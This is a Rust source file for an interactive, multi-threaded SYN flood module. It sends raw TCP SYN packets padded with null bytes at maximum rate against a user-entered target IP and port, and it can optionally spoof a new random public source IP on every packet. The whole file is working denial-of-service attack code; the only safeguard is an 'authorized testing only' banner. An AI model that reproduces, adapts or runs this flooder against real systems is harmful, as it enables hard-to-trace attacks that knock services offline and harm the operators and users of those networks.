//! Null SYN Exhaustion Testing Module
//!
//! High-performance SYN flood with null-byte payloads for resource exhaustion testing.
//! Uses native OS threads for CPU-bound packet generation with minimal overhead.
//! FOR AUTHORIZED TESTING ONLY.

use anyhow::{anyhow, Context, Result};
use colored::*;
use pnet_packet::ip::IpNextHeaderProtocols;
use pnet_packet::ipv4::{self, MutableIpv4Packet};
use pnet_packet::tcp::{MutableTcpPacket, TcpFlags};
use socket2::{Domain, Protocol, Socket, Type};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant, SystemTime};
use crate::utils::{
    normalize_target, prompt_default, prompt_port, prompt_required, prompt_yes_no,
};

// ============================================================================
// CONSTANTS
// ============================================================================

const IPV4_HEADER_LEN: usize = 20;
const TCP_HEADER_LEN: usize = 20;
const STATS_BATCH_SIZE: u64 = 500;      // Flush stats every N packets
const DEFAULT_TTL: u8 = 64;
const DEFAULT_WINDOW: u16 = 64240;

// ============================================================================
// CONFIGURATION
// ============================================================================

/// Configuration for the exhaustion test
#[derive(Clone, Debug)]
pub struct ExhaustionConfig {
    target_ip: Ipv4Addr,
    target_port: u16,
    source_port: Option<u16>,
    use_random_source_ip: bool,
    worker_count: usize,
    duration_secs: u64,
    interval_mode: IntervalMode,
    payload_size: usize,
    verbose: bool,
}

#[derive(Clone, Copy, Debug)]
pub enum IntervalMode {
    /// Maximum speed - no artificial delay
    Zero,
    /// Fixed delay between packets in microseconds
    DelayMicros(u64),
}

// ============================================================================
// FAST RNG (Thread-Safe Seeding)
// ============================================================================

/// XorShift128+ PRNG - high performance, non-cryptographic
/// Each instance is uniquely seeded using thread ID + time for isolation
struct FastRng {
    s0: u64,
    s1: u64,
}

impl FastRng {
    /// Create a new RNG with unique seed per caller
    fn with_thread_seed(thread_id: usize) -> Self {
        let time_seed = match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
            Ok(d) => d.as_nanos() as u64,
            Err(_) => 0,
        };
        
        // Mix thread ID with time to ensure unique seeds across threads
        let s0 = time_seed ^ (thread_id as u64).wrapping_mul(0x9E3779B97F4A7C15);
        let s1 = (time_seed.rotate_left(17)) ^ (thread_id as u64).wrapping_mul(0xBF58476D1CE4E5B9);
        
        let mut rng = Self { s0, s1 };
        // Warm up the RNG state
        for _ in 0..16 {
            rng.next_u64();
        }
        rng
    }

    #[inline(always)]
    fn next_u64(&mut self) -> u64 {
        let mut x = self.s0;
        let y = self.s1;
        self.s0 = y;
        x ^= x << 23;
        self.s1 = x ^ y ^ (x >> 17) ^ (y >> 26);
        self.s1.wrapping_add(y)
    }

    #[inline(always)]
    fn next_u32(&mut self) -> u32 {
        self.next_u64() as u32
    }

    #[inline(always)]
    fn next_u16(&mut self) -> u16 {
        self.next_u64() as u16
    }

    #[inline(always)]
    fn gen_ipv4_public(&mut self) -> Ipv4Addr {
        loop {
            let octets = self.next_u32().to_be_bytes();
            // Exclude: loopback, any, multicast, reserved, private ranges
            match octets[0] {
                0 | 10 | 127 => continue,                           // 0.x, 10.x, 127.x
                224..=255 => continue,                               // Multicast / Reserved
                172 if (16..=31).contains(&octets[1]) => continue,  // 172.16-31.x
                192 if octets[1] == 168 => continue,                 // 192.168.x
                169 if octets[1] == 254 => continue,                 // 169.254.x (link-local)
                100 if (64..=127).contains(&octets[1]) => continue, // 100.64-127.x (CGNAT)
                _ => return Ipv4Addr::new(octets[0], octets[1], octets[2], octets[3]),
            }
        }
    }

    #[inline(always)]
    fn gen_ephemeral_port(&mut self) -> u16 {
        // Range: 49152-65535 (IANA ephemeral)
        (self.next_u16() % 16384) + 49152
    }
}

// ============================================================================
// PACKET BUILDER
// ============================================================================

/// Pre-allocated packet buffer with efficient field updates
struct PacketBuilder {
    buffer: Vec<u8>,
    use_random_src_ip: bool,
    fixed_src_ip: Ipv4Addr,
    fixed_src_port: Option<u16>,
    target_ip: Ipv4Addr,
    target_port: u16,
}

impl PacketBuilder {
    fn new(config: &ExhaustionConfig, local_ip: Ipv4Addr) -> Result<Self> {
        let total_len = IPV4_HEADER_LEN + TCP_HEADER_LEN + config.payload_size;
        let buffer = vec![0u8; total_len];
        
        Ok(Self {
            buffer,
            use_random_src_ip: config.use_random_source_ip,
            fixed_src_ip: local_ip,
            fixed_src_port: config.source_port,
            target_ip: config.target_ip,
            target_port: config.target_port,
        })
    }

    /// Update dynamic fields and compute checksums
    /// Returns a reference to the ready-to-send buffer
    #[inline]
    fn build_packet(&mut self, rng: &mut FastRng) -> &[u8] {
        // CRITICAL: Generate random source IP for each packet when spoofing is enabled
        let src_ip = if self.use_random_src_ip {
            rng.gen_ipv4_public()  // Generate a NEW random IP for EVERY packet
        } else {
            self.fixed_src_ip
        };
        
        let src_port = self.fixed_src_port.unwrap_or_else(|| rng.gen_ephemeral_port());
        let ip_id = rng.next_u16();
        let seq_num = rng.next_u32();
        
        let total_len = self.buffer.len() as u16;
        
        // Build IP header from scratch each time to ensure source IP is set correctly
        if let Some(mut ip) = MutableIpv4Packet::new(&mut self.buffer) {
            ip.set_version(4);
            ip.set_header_length(5);
            ip.set_dscp(0);
            ip.set_ecn(0);
            ip.set_total_length(total_len);
            ip.set_identification(ip_id);
            ip.set_flags(0);
            ip.set_fragment_offset(0);
            ip.set_ttl(DEFAULT_TTL);
            ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
            ip.set_source(src_ip);  // CRITICAL: Set the random source IP here
            ip.set_destination(self.target_ip);
            
            // Calculate IP checksum
            ip.set_checksum(0);
            let checksum = ipv4::checksum(&ip.to_immutable());
            ip.set_checksum(checksum);
        }
        
        // Build TCP header
        if let Some(mut tcp) = MutableTcpPacket::new(&mut self.buffer[IPV4_HEADER_LEN..]) {
            tcp.set_source(src_port);
            tcp.set_destination(self.target_port);
            tcp.set_sequence(seq_num);
            tcp.set_acknowledgement(0);
            tcp.set_data_offset(5);
            tcp.set_reserved(0);
            tcp.set_flags(TcpFlags::SYN);
            tcp.set_window(DEFAULT_WINDOW);
            tcp.set_urgent_ptr(0);
            tcp.set_checksum(0);
        }
        
        // Calculate TCP checksum with pseudo-header
        let tcp_checksum = self.calculate_tcp_checksum(src_ip);
        
        if let Some(mut tcp) = MutableTcpPacket::new(&mut self.buffer[IPV4_HEADER_LEN..]) {
            tcp.set_checksum(tcp_checksum);
        }
        
        &self.buffer
    }
    
    #[inline]
    fn calculate_tcp_checksum(&self, src_ip: Ipv4Addr) -> u16 {
        let mut sum: u32 = 0;

        // 1. Pseudo-Header Sum
        // Source IP
        let src_octets = src_ip.octets();
        sum += u16::from_be_bytes([src_octets[0], src_octets[1]]) as u32;
        sum += u16::from_be_bytes([src_octets[2], src_octets[3]]) as u32;

        // Dest IP
        let dst_octets = self.target_ip.octets();
        sum += u16::from_be_bytes([dst_octets[0], dst_octets[1]]) as u32;
        sum += u16::from_be_bytes([dst_octets[2], dst_octets[3]]) as u32;
        
        // Reserved (0) + Protocol (6 for TCP)
        sum += IpNextHeaderProtocols::Tcp.0 as u32;
        
        // TCP Length (Header + Payload)
        let tcp_len = (self.buffer.len() - IPV4_HEADER_LEN) as u32;
        sum += tcp_len;

        // 2. TCP Header + Payload Sum
        let tcp_data = &self.buffer[IPV4_HEADER_LEN..];
        for chunk in tcp_data.chunks(2) {
            if chunk.len() == 2 {
                sum += u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
            } else if chunk.len() == 1 {
                // Pad last odd byte with zero
                sum += u16::from_be_bytes([chunk[0], 0]) as u32;
            }
        }

        // Fold 32-bit sum to 16-bit
        while (sum >> 16) != 0 {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        
        !(sum as u16)
    }
    
    #[inline]
    fn packet_size(&self) -> usize {
        self.buffer.len()
    }
}

// ============================================================================
// WORKER THREAD
// ============================================================================

/// Statistics for a single worker
struct WorkerStats {
    packets: u64,
    bytes: u64,
}

/// Run the packet sending loop for a single worker thread
fn worker_thread(
    worker_id: usize,
    config: ExhaustionConfig,
    local_ip: Ipv4Addr,
    stop_flag: Arc<AtomicBool>,
    global_packets: Arc<AtomicU64>,
    global_bytes: Arc<AtomicU64>,
    start_time: Instant,
) {
    // Create dedicated socket for this worker (no contention)
    let socket = match create_raw_socket() {
        Ok(s) => s,
        Err(e) => {
            if worker_id == 0 {
                eprintln!("\n{}", format!("[!] Worker 0 socket error: {}", e).red().bold());
            }
            return;
        }
    };
    
    // Pre-allocate packet builder
    let mut builder = match PacketBuilder::new(&config, local_ip) {
        Ok(b) => b,
        Err(e) => {
            if worker_id == 0 {
                eprintln!("\n{}", format!("[!] Packet builder error: {}", e).red());
            }
            return;
        }
    };
    
    // Thread-local RNG with unique seed
    let mut rng = FastRng::with_thread_seed(worker_id);
    
    // Destination socket address (constant)
    let dst_addr: socket2::SockAddr = SocketAddr::new(IpAddr::V4(config.target_ip), 0).into();
    
    let duration = Duration::from_secs(config.duration_secs);
    let delay = match config.interval_mode {
        IntervalMode::Zero => None,
        IntervalMode::DelayMicros(us) => Some(Duration::from_micros(us)),
    };
    
    let packet_size = builder.packet_size() as u64;
    let mut stats = WorkerStats { packets: 0, bytes: 0 };
    
    // Main send loop
    loop {
        // Check termination conditions
        if stop_flag.load(Ordering::Relaxed) || start_time.elapsed() >= duration {
            break;
        }
        
        // Build packet with NEW random source IP each time if spoofing enabled
        let packet = builder.build_packet(&mut rng);
        
        match socket.send_to(packet, &dst_addr) {
            Ok(_) => {
                stats.packets += 1;
                stats.bytes += packet_size;
            }
            Err(e) => {
                // Log permission errors only once
                if config.verbose && worker_id == 0 {
                    let err_str = e.to_string();
                    if err_str.contains("ermission") || err_str.contains("EPERM") {
                        eprintln!("\n{}", "[!] Root privileges required for raw sockets.".red().bold());
                        stop_flag.store(true, Ordering::Relaxed);
                        break;
                    }
                }
            }
        }
        
        // Batch update global stats to reduce atomic contention
        if stats.packets >= STATS_BATCH_SIZE {
            global_packets.fetch_add(stats.packets, Ordering::Relaxed);
            global_bytes.fetch_add(stats.bytes, Ordering::Relaxed);
            stats.packets = 0;
            stats.bytes = 0;
        }
        
        // Apply delay if configured
        if let Some(d) = delay {
            thread::sleep(d);
        }
    }
    
    // Flush remaining stats
    if stats.packets > 0 {
        global_packets.fetch_add(stats.packets, Ordering::Relaxed);
        global_bytes.fetch_add(stats.bytes, Ordering::Relaxed);
    }
}

/// Create an optimized raw socket for IP spoofing
fn create_raw_socket() -> Result<Socket> {
    let socket = Socket::new(
        Domain::IPV4,
        Type::RAW,
        Some(Protocol::from(libc::IPPROTO_RAW)),
    ).context("Failed to create raw socket (requires root)")?;
    
    // CRITICAL: Enable IP_HDRINCL to allow custom IP headers (required for spoofing)
    socket.set_header_included_v4(true)
        .context("Failed to set IP_HDRINCL")?;
    
    // Increase send buffer for burst capacity
    let _ = socket.set_send_buffer_size(256 * 1024);
    
    Ok(socket)
}

// ============================================================================
// MAIN EXECUTION
// ============================================================================

/// Entry point for the module
pub async fn run(initial_target: &str) -> Result<()> {
    display_banner();
    let config = gather_config(initial_target)?;
    execute_attack(config).await
}

fn display_banner() {
    println!("{}", r#"
╔══════════════════════════════════════════════════════════════╗
║   Null SYN Exhaustion Testing Module v2.1                    ║
║   High-Performance Multi-Threaded Engine                     ║
║   With True IP Spoofing Support                              ║
║   FOR AUTHORIZED TESTING ONLY                                ║
╚══════════════════════════════════════════════════════════════╝
"#.red().bold());
}

fn gather_config(initial_target: &str) -> Result<ExhaustionConfig> {
    println!("{}", "=== Configuration ===".bold());
    
    // Target IP
    let target_input = if initial_target.trim().is_empty() {
        prompt_required("Target IP")?
    } else {
        println!("{}", format!("[*] Using target: {}", initial_target).cyan());
        initial_target.to_string()
    };
    
    let normalized = normalize_target(&target_input)?;
    let target_ip: Ipv4Addr = normalized.parse()
        .map_err(|_| anyhow!("Target must be a valid IPv4 address"))?;
    
    // Target Port
    let target_port = prompt_port("Target port", 80)?;
    
    // Source Port
    let src_port_input = prompt_default("Source port (blank for random)", "")?;
    let source_port = if src_port_input.is_empty() {
        None
    } else {
        Some(src_port_input.parse::<u16>().map_err(|_| anyhow!("Invalid port"))?)
    };
    
    // Random Source IP
    let use_random_source_ip = prompt_yes_no(
        "Use random (spoofed) source IPs? (requires root)", 
        false
    )?;
    
    // Worker count - default to CPU cores for optimal performance
    let cpu_count = num_cpus::get();
    let workers_input = prompt_default(
        &format!("Worker threads (recommended: {})", cpu_count),
        &cpu_count.to_string()
    )?;
    let worker_count: usize = workers_input.parse().map_err(|_| anyhow!("Invalid number"))?;
    
    if worker_count == 0 {
        return Err(anyhow!("Worker count must be > 0"));
    }
    
    // Duration
    let duration_input = prompt_required("Test duration (seconds)")?;
    let duration_secs: u64 = duration_input.parse().map_err(|_| anyhow!("Invalid duration"))?;
    
    if duration_secs == 0 {
        return Err(anyhow!("Duration must be > 0"));
    }
    
    // Interval Mode
    let zero_interval = prompt_yes_no("Use zero interval (max speed)?", true)?;
    let interval_mode = if zero_interval {
        IntervalMode::Zero
    } else {
        let delay_input = prompt_default("Delay between packets (microseconds)", "1000")?;
        let delay: u64 = delay_input.parse().map_err(|_| anyhow!("Invalid delay"))?;
        IntervalMode::DelayMicros(delay)
    };
    
    // Payload Size
    let payload_input = prompt_default("Null-byte payload size", "1024")?;
    let mut payload_size: usize = payload_input.parse().map_err(|_| anyhow!("Invalid size"))?;
    
    // Cap to IPv4 maximum
    const MAX_PAYLOAD: usize = 65535 - IPV4_HEADER_LEN - TCP_HEADER_LEN;
    if payload_size > MAX_PAYLOAD {
        println!("{}", format!("[!] Payload capped at {} bytes", MAX_PAYLOAD).yellow());
        payload_size = MAX_PAYLOAD;
    }
    
    let verbose = prompt_yes_no("Verbose output?", false)?;
    
    // Summary
    println!("\n{}", "=== Test Configuration ===".bold());
    println!("  Target:       {}:{}", target_ip, target_port);
    println!("  Source Port:  {}", source_port.map(|p| p.to_string()).unwrap_or_else(|| "random".into()));
    println!("  Random IP:    {}", if use_random_source_ip { "yes (spoofed - NEW IP per packet)" } else { "no" });
    println!("  Workers:      {} threads", worker_count);
    println!("  Duration:     {}s", duration_secs);
    println!("  Interval:     {:?}", interval_mode);
    println!("  Payload:      {} bytes", payload_size);
    println!("  Packet Size:  {} bytes", IPV4_HEADER_LEN + TCP_HEADER_LEN + payload_size);
    
    if use_random_source_ip {
        println!("\n{}", "[!] IP spoofing enabled: Each packet will have a different random source IP".yellow().bold());
    }
    
    if !prompt_yes_no("\nProceed with test?", true)? {
        return Err(anyhow!("Test cancelled by user"));
    }
    
    Ok(ExhaustionConfig {
        target_ip,
        target_port,
        source_port,
        use_random_source_ip,
        worker_count,
        duration_secs,
        interval_mode,
        payload_size,
        verbose,
    })
}

async fn execute_attack(config: ExhaustionConfig) -> Result<()> {
    println!("\n{}", "[*] Initializing attack engine...".yellow().bold());
    
    // Shared state
    let stop_flag = Arc::new(AtomicBool::new(false));
    let packets_sent = Arc::new(AtomicU64::new(0));
    let bytes_sent = Arc::new(AtomicU64::new(0));
    
    // Detect local IP if needed (only used when NOT spoofing)
    let local_ip = if !config.use_random_source_ip {
        get_local_ipv4().unwrap_or(Ipv4Addr::new(127, 0, 0, 1))
    } else {
        Ipv4Addr::UNSPECIFIED
    };
    
    if config.use_random_source_ip {
        println!("{}", "[*] IP Spoofing Mode: Each packet will use a different random source IP".green().bold());
    } else {
        println!("[*] Local IP: {}", local_ip);
    }
    
    println!("[*] Spawning {} worker threads...", config.worker_count);
    
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    
    // Spawn native OS threads (not tokio tasks - blocking I/O)
    let mut handles = Vec::with_capacity(config.worker_count);
    
    for worker_id in 0..config.worker_count {
        let config = config.clone();
        let stop = stop_flag.clone();
        let pkts = packets_sent.clone();
        let bts = bytes_sent.clone();
        
        let handle = thread::spawn(move || {
            worker_thread(worker_id, config, local_ip, stop, pkts, bts, start_time);
        });
        
        handles.push(handle);
    }
    
    println!("{}", "[*] Attack started!".green().bold());
    
    // Stats display loop (async-friendly)
    let stats_stop = stop_flag.clone();
    let stats_pkts = packets_sent.clone();
    let stats_bytes = bytes_sent.clone();
    
    let stats_task = tokio::spawn(async move {
        while !stats_stop.load(Ordering::Relaxed) {
            tokio::time::sleep(Duration::from_secs(2)).await;
            
            let pkts = stats_pkts.load(Ordering::Relaxed);
            let bytes = stats_bytes.load(Ordering::Relaxed);
            let elapsed = start_time.elapsed().as_secs_f64();
            
            let rate = if elapsed > 0.0 { pkts as f64 / elapsed } else { 0.0 };
            let mbps = if elapsed > 0.0 { (bytes as f64 * 8.0) / (elapsed * 1_000_000.0) } else { 0.0 };
            
            print!("\r{}", format!(
                "[*] Packets: {:>10} | {:>7.2} MB | Rate: {:>9.0} pkt/s | {:>6.2} Mbps   ",
                pkts,
                bytes as f64 / (1024.0 * 1024.0),
                rate,
                mbps
            ).dimmed());
            let _ = std::io::Write::flush(&mut std::io::stdout());
        }
    });
    
    // Wait for test duration
    tokio::time::sleep(duration).await;
    
    // Signal workers to stop
    stop_flag.store(true, Ordering::SeqCst);
    
    // Wait for all workers to finish
    for handle in handles {
        let _ = handle.join();
    }
    
    stats_task.abort();
    
    // Final statistics
    let total_pkts = packets_sent.load(Ordering::Relaxed);
    let total_bytes = bytes_sent.load(Ordering::Relaxed);
    let elapsed = start_time.elapsed();
    let elapsed_secs = elapsed.as_secs_f64();
    
    println!("\n\n{}", "=== Attack Complete ===".green().bold());
    println!("  Duration:      {:.2}s", elapsed_secs);
    println!("  Total Packets: {}", total_pkts);
    println!("  Total Data:    {:.2} MB", total_bytes as f64 / (1024.0 * 1024.0));
    
    if elapsed_secs > 0.0 {
        println!("  Avg Rate:      {:.0} pkt/s", total_pkts as f64 / elapsed_secs);
        println!("  Avg Bandwidth: {:.2} Mbps", (total_bytes as f64 * 8.0) / (elapsed_secs * 1_000_000.0));
    }
    
    Ok(())
}

fn get_local_ipv4() -> Option<Ipv4Addr> {
    use std::net::UdpSocket;
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    match socket.local_addr().ok()?.ip() {
        IpAddr::V4(ip) => Some(ip),
        _ => None,
    }
}
